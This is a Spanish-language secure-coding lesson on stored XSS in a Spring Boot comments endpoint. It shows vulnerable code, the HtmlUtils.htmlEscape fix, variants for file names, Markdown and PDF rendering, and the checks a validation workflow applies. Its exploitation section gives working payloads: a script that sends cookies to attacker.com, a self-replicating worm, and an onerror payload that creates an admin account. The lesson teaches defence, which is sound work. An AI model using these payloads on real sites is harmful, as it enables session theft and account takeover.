# Paso 25 — XSS Stored
**Tecnologia:** Java / Spring Boot | **OWASP:** A03:2021 - Injection | **CWE-79**

---

## Que es esta vulnerabilidad?

XSS Stored (tambien llamado XSS Persistente) es la variante mas peligrosa de Cross-Site Scripting. A diferencia del XSS Reflected, el payload malicioso se almacena permanentemente en el servidor (base de datos, logs, sistema de archivos) y se ejecuta automaticamente en el navegador de CUALQUIER usuario que visualice ese contenido, sin que tengan que seguir un enlace especial.

Un comentario malicioso en un blog, un nombre de producto en un e-commerce, un campo de perfil de usuario, un titulo de ticket de soporte: cualquier dato almacenado que posteriormente se renderiza en HTML sin escapar es un vector potencial de XSS stored. El atacante inyecta el payload una sola vez y afecta a todos los usuarios futuros que vean ese contenido, durante todo el tiempo que el dato permanezca en el sistema.

El impacto puede ser masivo: si el payload se inyecta en un campo que ve un administrador (por ejemplo, el nombre de un usuario que aparece en el panel de administracion), el atacante puede secuestrar la sesion del admin y tomar control total del sistema.

---

## Donde ocurre en este codigo?

**Archivo:** `src/java/src/main/java/com/example/api/controller/CommentsController.java`

```java
// CODIGO VULNERABLE — estado actual del ejercicio

// Almacenamiento: el comentario se guarda tal cual viene del cliente
@PostMapping
public ResponseEntity<?> addComment(@RequestBody Map<String, String> body) {
    String comment = body.get("comment");
    comments.add(comment);  // se almacena sin sanitizar
    return ResponseEntity.ok().build();
}

// Renderizado: el comentario se inserta en HTML sin escapar
@GetMapping
@ResponseBody
public String getComments() {
    StringBuilder sb = new StringBuilder("<ul>");
    for (String c : comments) {
        sb.append("<li>").append(c).append("</li>");  // sin escape
    }
    sb.append("</ul>");
    return sb.toString();
}
```

Cuando se almacena `<script>alert(document.cookie)</script>` como comentario, todos los usuarios que visiten la pagina de comentarios reciben ese script en el HTML y el navegador lo ejecuta.

---

## Como lo explotaria un atacante

**Paso 1 — Inyectar el payload (una sola vez):**
```json
POST /api/comments
Content-Type: application/json

{"comment": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"}
```

**Paso 2 — Todos los visitantes futuros ejecutan el script:**
```
GET /api/comments
# La respuesta incluye:
# <li><script>fetch('https://attacker.com/steal?c='+document.cookie)</script></li>
# El navegador de cada visitante ejecuta el fetch, enviando sus cookies al atacante
```

**Payload mas sofisticado — worm XSS (autopropagacion):**
```javascript
// El script se replica: al ejecutarse, publica el mismo comentario
const worm = `<script>
fetch('/api/comments', {method:'POST', headers:{'Content-Type':'application/json'},
body: JSON.stringify({comment: document.currentScript.outerHTML})});
fetch('https://attacker.com/steal?c=' + document.cookie);
</script>`;
```

**XSS en el panel de administracion:**
```json
{"comment": "<img src=x onerror=\"fetch('/api/admin/create-admin', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body:JSON.stringify({username:'attacker', role:'admin'})})\">"}
```
Cuando el admin ve los comentarios, el `onerror` se ejecuta con la sesion del admin y crea un nuevo usuario administrador.

---

## Tu tarea: aplicar la mitigacion

Modifica `src/java/src/main/java/com/example/api/controller/CommentsController.java` para escapar el contenido al renderizarlo:

```java
// CODIGO SEGURO
package com.example.api.controller;

import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.util.HtmlUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

@RestController
@RequestMapping("/api/comments")
public class CommentsController {

    private final List<String> comments = new ArrayList<>();

    @PostMapping
    public ResponseEntity<?> addComment(@RequestBody Map<String, String> body) {
        String comment = body.get("comment");
        if (comment == null || comment.isBlank()) {
            return ResponseEntity.badRequest().body("Comentario vacio");
        }
        comments.add(comment);
        return ResponseEntity.ok().build();
    }

    @GetMapping
    @ResponseBody
    public String getComments() {
        StringBuilder sb = new StringBuilder("<ul>");
        for (String c : comments) {
            // Escapar en el punto de salida: convertir < > " & ' en entidades HTML
            sb.append("<li>").append(HtmlUtils.htmlEscape(c)).append("</li>");
        }
        sb.append("</ul>");
        return sb.toString();
    }
}
```

### Por que funciona esta mitigacion?

- **Escapado en el punto de renderizado (output encoding):** el dato se almacena con el contenido original (incluyendo `<script>...`). El escape ocurre justo antes de insertarlo en el HTML. Esto es preferible a sanitizar al guardar porque preserva el texto original para otros usos (APIs JSON, busqueda, etc.) donde `<script>` es texto literal valido.
- **Por que no sanitizar al guardar:** si se sanitiza al almacenar, se pierde el dato original. Ademas, la misma cadena puede necesitar diferentes tratamientos segun el contexto (HTML, JSON, CSV, email). El escape en el punto de salida permite tratar cada contexto correctamente.
- **`HtmlUtils.htmlEscape`:** convierte `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `&` → `&amp;`. El navegador muestra el texto literal pero no lo ejecuta como HTML.
- **Content-Security-Policy:** ademas del escape, una cabecera CSP `default-src 'self'; script-src 'self'` instruye al navegador a no ejecutar scripts inline, proporcionando una segunda capa de defensa aunque el escape falle puntualmente.

---

## Variantes de la misma categoria (XSS Stored — contextos avanzados)

### Variante A: XSS Stored via nombre de archivo en upload

```java
// VULNERABLE — mostrar el nombre original del archivo en HTML sin escapar
@GetMapping("/files")
@ResponseBody
public String listFiles() {
    StringBuilder sb = new StringBuilder("<ul>");
    for (String filename : uploadedFiles) {
        sb.append("<li><a href='/download/").append(filename)
          .append("'>").append(filename).append("</a></li>");
    }
    sb.append("</ul>");
    return sb.toString();
}
```

El atacante sube un archivo con nombre `"><img src=x onerror=alert(1)>.jpg`. El nombre se almacena y al listar archivos, el payload se ejecuta.

```java
// SEGURO — escapar nombre en href Y en el texto visible
for (String filename : uploadedFiles) {
    String safeFilename = HtmlUtils.htmlEscape(filename);
    sb.append("<li><a href='/download/").append(safeFilename)
      .append("'>").append(safeFilename).append("</a></li>");
}
```

---

### Variante B: XSS via Markdown rendering (insufficient sanitization)

```python
# VULNERABLE — renderizar Markdown de usuarios sin sanitizar el HTML resultante
import markdown

@app.post("/posts")
async def create_post(content: str):
    html_content = markdown.markdown(content)  # convierte MD a HTML
    db.posts.insert({"content": html_content})  # almacena HTML con posibles tags

@app.get("/posts/{id}")
async def get_post(id: str):
    post = db.posts.find_one({"_id": id})
    return HTMLResponse(post["content"])  # devuelve el HTML sin sanitizar
```

Payload Markdown: `[click me](javascript:alert(document.cookie))`  
El Markdown renderer genera `<a href="javascript:alert(...)">click me</a>` — XSS via protocolo javascript:.

```python
# SEGURO — sanitizar el HTML resultante con bleach/nh3
import nh3  # o bleach

@app.post("/posts")
async def create_post(content: str):
    html_raw = markdown.markdown(content)
    # Permitir solo tags seguros, ningún atributo javascript:
    html_clean = nh3.clean(html_raw, tags={"p", "b", "i", "ul", "li", "h2", "code"})
    db.posts.insert({"content": html_clean})
```

---

### Variante C: XSS Stored en PDF generation

```java
// VULNERABLE — generar PDF con HTML del usuario sin escapar (iText/Flying Saucer)
@PostMapping("/invoices")
public byte[] generateInvoice(@RequestBody Map<String, String> data) {
    String html = "<html><body>"
        + "<h1>Factura para: " + data.get("companyName") + "</h1>"  // sin escape
        + "</body></html>";
    return pdfRenderer.render(html);  // el HTML con scripts puede hacer peticiones
}
```

Algunos motores de PDF como wkhtmltopdf ejecutan JavaScript durante el renderizado — esto puede ser un vector SSRF si el JS hace fetch a servicios internos.

```java
// SEGURO — escapar antes de insertar en el template HTML del PDF
String safeName = HtmlUtils.htmlEscape(data.get("companyName"));
String html = "<html><body><h1>Factura para: " + safeName + "</h1></body></html>";
// Ademas: usar motores que no ejecutan JS (iText, Apache FOP)
```

---

## Referencias

- [OWASP A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Stored XSS](https://owasp.org/www-community/attacks/xss/#stored-xss-attacks)

---

## Lo que valida el workflow automaticamente

El workflow **Validate Step 25** exige que `src/java/src/main/java/com/example/api/controller/CommentsController.java` contenga:
- `HtmlUtils.htmlEscape(c)`
- La ausencia de `.append(c).append("</li>")`
